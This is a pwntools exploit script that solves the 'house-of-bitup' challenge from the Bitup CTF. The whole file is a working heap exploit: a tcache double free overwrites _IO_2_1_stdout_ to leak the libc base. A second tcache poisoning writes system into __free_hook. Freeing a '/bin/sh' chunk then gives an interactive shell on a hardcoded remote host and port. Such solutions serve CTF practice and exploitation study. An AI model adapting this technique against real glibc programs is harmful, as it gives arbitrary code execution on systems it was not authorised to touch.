from pwn import *

# --- Info ---
# CTF: Bitup
# Date: 23 Oct 2020
# Challenge: house-of-bitup
# Description: Leak libc through _IO_2_1_stdout overwrite and tcache poisoning
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

PATH = './house-of-bitup'
LIBC = './libc.so.6'
ENV = {"LD_PRELOAD":"./libc.so.6"}
libc  = ELF(LIBC, checksec = False)

REMOTE = 1

HOST = '167.99.252.86'
PORT = 8001

def create(size, data, post_leak = False, first_pl = False):
    if(post_leak):
        if(not first_pl):
            r.recvuntil('Choice: ')
        r.sendline('1')
        r.recvuntil('Size:')
        r.sendline(str(int(size)))
        r.recvuntil('Data:')
        r.send(data)
        return
    r.recvuntil('Choice: \n')
    r.sendline('1')
    r.recvuntil('Size:\n')
    r.sendline(str(int(size)))
    r.recvuntil('Data:\n')
    r.send(data)
    return

def delete(idx, post_leak = False, first_pl = False):
    if(post_leak):
        if(not first_pl):
            r.recvuntil('Choice: ')
        r.sendline('2')
        r.recvuntil('Index:')
        r.sendline(str(int(idx)))
        return
    r.recvuntil('Choice: ')
    r.sendline('2')
    r.recvuntil('Index:')
    r.sendline(str(int(idx)))
    return

context.binary = PATH
r = remote(HOST, PORT) if REMOTE else process(PATH, env=ENV)
OFFSET_LEAK = 0x3ed8b0
STDOUT_BSS = 0x601020
chunks = 0x6010c0

#gdb.attach(r)

create(0x28, "/bin/sh\x00") # 0 - get any chunk

# double free

delete(0)
delete(0)

# tcache -> chunk_0 -> chunk_0

create(0x28, p64(STDOUT_BSS)) # 1

# tcache -> chunk_0 -> STDOUT_BSS -> _IO_2_1_stdout_

create(0x28, "/bin/sh\x00") # 2

# tcache -> STDOUT_BSS -> _IO_2_1_stdout_

create(0x28, "\x60") # STDOUT_BSS

# overwrite _IO_2_1_stdout_ to leak in next puts

create(0x28, p64(0xfbad1800) + p64(0x0) * 3 + '\x00') # _IO_2_1_stdout_

data = r.recv()
leak = u64(data[8:-8][:8])

libc.address = leak - OFFSET_LEAK
log.info(f"leak @ {hex(leak)}")
log.info(f"libc base @ {hex(libc.address)}")
log.info("__free_hook @ " + hex(libc.sym["__free_hook"]))
log.info("system @ " + hex(libc.sym["system"]))

# tcache poisoning

# overwrite __free_hook with system
# call free("/bin/sh\x00")

# tcache -> NULL

create(0x10, "AAAA", True, True) # ptr (3)

# double free

delete(3, True)

# tcache -> ptr

delete(3, True)

# tcache -> ptr -> ptr

create(0x10, p64(libc.sym["__free_hook"]), True) # 6

# tcache -> ptr -> __free_hook

create(0x10, "AAAA", True) # 7

# tcache -> __free_hook

create(0x10, p64(libc.sym["system"]), True) # fake chunk returned in __free_hook (8)

# call free with command argument

delete(0, True)

r.interactive()
r.close()

